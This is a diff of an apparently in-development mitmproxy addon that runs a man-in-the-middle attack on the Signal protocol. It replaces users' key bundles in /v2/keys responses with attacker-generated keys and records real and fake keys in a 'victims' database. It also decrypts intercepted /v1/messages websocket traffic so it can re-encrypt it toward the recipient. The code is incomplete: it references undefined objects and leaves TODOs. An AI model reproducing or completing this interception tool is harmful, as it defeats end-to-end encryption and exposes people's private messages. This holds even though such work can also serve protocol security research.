@@ -11,14 +11,21 @@ from proto_python.wire_pb2 import *
 from proto_python.SignalService_pb2 import *
 from proto_python.storage_pb2 import *
 from proto_python.WebSocketResources_pb2 import *
+from proto_python.SignalService_pb2 import *
 from proto_python import *
 from test_protocol import *
 
+protocol_runs = dict()
 
 def try_run_sudo(cmd):
     try_run(f"sudo {cmd}")
 
-
+def try_except(success, failure, *exceptions):
+    try:
+        return success()
+    except exceptions or Exception:
+        return failure() if callable(failure) else failure
+    
 def try_run(cmd: str):
     try:
         res = subprocess.run(cmd, shell=True, check=True, stdout=open(os.devnull, "wb"))
@@ -46,17 +53,18 @@ def fake_key_gen(preKeysId=1, signedKeyId=1):
 
     preKeys = [(i["privKey"], i["pubKey"]) for i in keys["preKeys"]]
 
-    # print(identity_key, signedPre_key, preKeys)
+    #print(identity_key, signedPre_key, preKeys)
 
     fake_keys = {
-        "identityKey": identity_key[1],
+        "identityKey": identity_key,
         "preKeys": [
-            {"keyId": preKeysId + id, "publicKey": key[1]}
-            for id, key in enumerate(preKeys)
+            {"keyId": preKeysId + id, "publicKey": keyPair[1], "privateKey": keyPair[0]}
+            for id, keyPair in enumerate(preKeys)
         ],
         "signedPreKey": {
             "keyId": signedKeyId,
             "publicKey": signedPre_key[1],
+            "privateKey": signedPre_key [0],
             "signature": signedPre_key[2],
         },
     }
@@ -136,11 +144,11 @@ def request(flow: http.HTTPFlow):
         )
         # fake_pni_keys = fake_key_gen()
         fake_IdenKey, fake_SignedPreKey, fake_PreKeys = (
-            fake_keys["identityKey"],
+            json.dumps(fake_keys["identityKey"]),
             json.dumps(fake_keys["signedPreKey"]),
             json.dumps(fake_keys["preKeys"]),
         )
-        # fake_pniIdenKey, fake_pniSignedPreKey, fake_pniPreKeys = fake_pni_keys["identityKey"], fake_pni_keys["signedPreKey"], fake_pni_keys["preKeys"]
+        ctx.log.alert((fake_IdenKey, fake_SignedPreKey, fake_PreKeys))
 
         query = f"UPDATE victims SET {identity}IdenKey = ?, {identity}SignedPreKey = ?, {identity}PreKeys = ?, {identity}FakeIdenKey = ?, {identity}FakeSignedPreKey = ?, {identity}FakePreKeys = ? WHERE pNumber = ? OR aci = ?"
         params = (
@@ -207,38 +215,46 @@ def response(flow: http.HTTPFlow):
 
     matches = re.match("\/v2\/keys\/([\w+-]+)\/(\*|\d)", flow.request.path)
     if matches and flow.request.method == "GET":
+        ctx.log.warn("Before GET request")
         groups = matches.groups()
         # ctx.log(f"regex matched: {groups}")
         if len(groups) != 2:
             ctx.log.error("sth is fucked")
         receiver, deviceID = groups[0], groups[1] if groups[1] != "*" else None
+        
         try:
             info = json.loads(flow.response.content)
         except Exception as e:
             ctx.log.error(f"{e.msg},\n\t{flow.response.content.decode()}")
 
         # fake_keys = fake_key_gen(preKeysId=info['devices'])
-
         # fake_IdenKey, fake_SignedPreKey, fake_PreKeys = fake_keys["identityKey"], json.dumps(fake_keys["signedPreKey"]), json.dumps(fake_keys["preKeys"])
 
-        ctx.log.alert(type(target))
+        ctx.log.alert((target))
         if target is None or target == "":
             bearer = flow.request.headers.get("Unidentified-Access-Key", None)
             #ctx.log.alert(bearer)
             res = cur.execute(
                 "SELECT aci FROM victims WHERE UnidentifiedAccessKey LIKE ? ", (bearer,)
             )
-            target = res.fetchone()[0]
-            #ctx.log(f"target : {target!r}")
+            #target = res.fetchone()[0]
+        ctx.log.warn(flow)
 
-        for device in info["devices"]:
+        devices=None
+        try :
+            devices = info["devices"]
+        except:
+            ctx.log.debug("No info about devices")
+            return
+        
+        for device in devices:
             # ctx.log(params)
             fake_keys = fake_key_gen(
                 preKeysId=device["preKey"]["keyId"],
                 signedKeyId=device["signedPreKey"]["keyId"],
             )
             fake_IdenKey, fake_SignedPreKey, fake_PreKeys = (
-                fake_keys["identityKey"],
+                json.dumps(fake_keys["identityKey"]),
                 json.dumps(fake_keys["signedPreKey"]),
                 json.dumps(fake_keys["preKeys"]),
             )
@@ -255,8 +271,8 @@ def response(flow: http.HTTPFlow):
             )
 
             cur.execute(
-                f"UPDATE end2end SET deviceId = ?, v_aci = ?, recv_aci = ?, recv_IdenKey = ?, recv_SignedPreKey = ?, recv_PreKey = ?, recv_FakeIdenKey = ?, recv_FakeSignedPreKey = ?, recv_FakePreKey = ? WHERE recv_aci = ?",
-                params + (receiver,),
+                f"UPDATE end2end SET deviceId = ?, v_aci = ?, recv_aci = ?, recv_IdenKey = ?, recv_SignedPreKey = ?, recv_PreKey = ?, recv_FakeIdenKey = ?, recv_FakeSignedPreKey = ?, recv_FakePreKey = ? WHERE (recv_aci = ? AND deviceId = ?)",
+                params + (receiver, device["deviceId"],),
             )
             cur.execute(
                 "INSERT OR IGNORE INTO end2end (deviceId, v_aci, recv_aci, recv_IdenKey, recv_SignedPreKey, recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey) VALUES (?,?,?,?,?,?,?,?,?)",
@@ -269,24 +285,56 @@ def response(flow: http.HTTPFlow):
 
 def websocket_message(flow: http.HTTPFlow):
     cont = flow.websocket.messages
+    conn = sqlite3.connect("mitm.db")
+    cur  = conn.cursor()
     for messages in cont:
+        ctx.log.warn(messages)
         ctx.log(messages.content)
         pattern = b"/v1/messages"
         proto_msg = WebSocketMessage()
 
         if pattern in messages.content:
             ctx.log.alert("you found it")
+            sourceUUid = flow.request.path.split("login=")[1].split("&")[0]
             proto_msg.ParseFromString(messages.content)
-            ctx.log.alert(proto_msg.request.body)
-            message = json.loads(proto_msg.request.body)
-            ctx.log.warn(message)
+            ctx.log.alert(proto_msg)
+            ctx.log.warn(f"diocane {proto_msg}")
+            body = json.loads(proto_msg.request.body)
+            ctx.log.warn(body)
             
             ##### Protocol Run?
+            recv = body['destination']
             
-            message["content"]
-
+            # check if protocol is available
             
+            ### try to x3dh if contact never seen before
+            aliceToMitm = {}.fromkeys(["recv_IdenKey", "recv_SignedPreKey", "recv_PreKey", "recv_FakeIdenKey", "recv_FakeSignedPreKey", "recv_FakePreKey"])
+            aliceToMitmKeys = cur.execute(f"SELECT recv_IdenKey, recv_SignedPreKey, recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey FROM end2end WHERE recv_aci = ? AND deviceId = 1;", (recv,)).fetchone()
+            #print((aliceToMitmKeys))
+            
+            mitmToBobKeys = cur.execute(f"SELECT aciIdenKey, aciSignedPreKey, aciPreKeys, aciFakeIdenKey, aciFakeSignedPreKey, aciFakePreKeys FROM victims WHERE aci = ?", (sourceUUid,)).fetchone() 
+            ctx.log.warn(mitmToBobKeys)
+            #result = cur.execute(query, params).fetchall()
+            uuidUser = Alice(pubIK=aliceToMitmKeys[0])
 
-
+            EncodedMessage = base64.b64decode(body['messages'][0]['content'])
+            type = body['messages'][0]['type'] #check out for creating instances of protocol
+            firstByte, protoMessage = EncodedMessage[1], EncodedMessage[1:]
+            
+            
+            
+            ## TODO: check if message is PrekeySignal or  SignalMessage
+            atm = AliceToMitm(bob = mitmA)
+            dec_msg = atm.BobReceive(EncodedMessage)
+            print(dec_msg)
+            
+            ############# COMPLETE HERE Mitm send to Bob
+            mitmB.x3dh(bob_bundle)
+            bob.x3dh(mitmB_bundle)
+            mitmToBob = MitmToBob(alice = mitmB, bob = bob)
+            msg_to_bob = mitmToBob.AliceSendSignalMessage(b"hey bob, you are dumb")
+            
+            
+                # other 
 #        cur.execute("CREATE TABLE end2end(v_aci, recv_aci, deviceId,recv_IdenKey, recv_SignedPreKey, \
 #            recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey, PRIMARY KEY (pNumber, aci, pni));")
